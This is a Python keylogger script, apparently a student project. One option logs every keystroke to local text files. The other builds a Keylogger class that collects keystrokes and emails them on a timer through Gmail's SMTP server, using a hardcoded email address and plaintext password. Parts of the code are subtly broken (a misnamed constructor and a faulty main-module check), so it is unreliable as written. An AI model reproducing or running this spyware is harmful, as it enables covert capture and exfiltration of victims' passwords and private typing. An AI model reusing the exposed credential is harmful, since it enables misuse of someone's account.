from pynput.keyboard import Key, Listener
import logging
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

print('Options 1.Text file 2.Email')
opt = int(input('Select option  : '))

if opt == 1:

    count = 0
    keys = []

    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

    def write_to_file(keys):
        with open("text.txt","a") as f:
            for key in keys:
                f.write(str(key))

    def on_press(key):
        logging.info(str(key))
        global keys,count
        keys.append(key)
        count += 1

        if count >= 10:
            count = 0
            write_to_file(keys)
            keys = []

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener :
        listener.join()

else:
    SEND_REPORT_EVERY = 60
    EMAIL_ADDRESS = "20071A05P7@vnrvjiet.in"
    EMAIL_PASSWORD = "vnrvjiet"

    class Keylogger:
        def init(self, interval, report_method="email"):

            self.interval = interval
            self.report_method = report_method
            self.log = ""

            self.start_dt = datetime.now()
            self.end_dt = datetime.now()


        def callback(self, event):

            name = event.name
            if len(name) > 1:

                if name == "space":

                    name = " "
                elif name == "enter":

                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:

                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"

            self.log += name


        def update_filename(self):

            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            with open(f"{self.filename}.txt", "w") as f:

                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def sendmail(self, email, password, message):

            server = smtplib.SMTP(host="smtp.gmail.com", port=587)

            server.starttls()

            server.login(email, password)

            server.sendmail(email, email, message)

            server.quit()

        def report(self):

            if self.log:

                    self.end_dt = datetime.now()

                    self.update_filename()
                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()

                    self.start_dt = datetime.now()
                    self.log = ""
                    timer = Timer(interval=self.interval, function=self.report)

                    timer.daemon = True

                    timer.start()

        def start(self):

                self.start_dt = datetime.now()

                keyboard.on_release(callback=self.callback)

                self.report()

                keyboard.wait()

    if name == "main":

        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
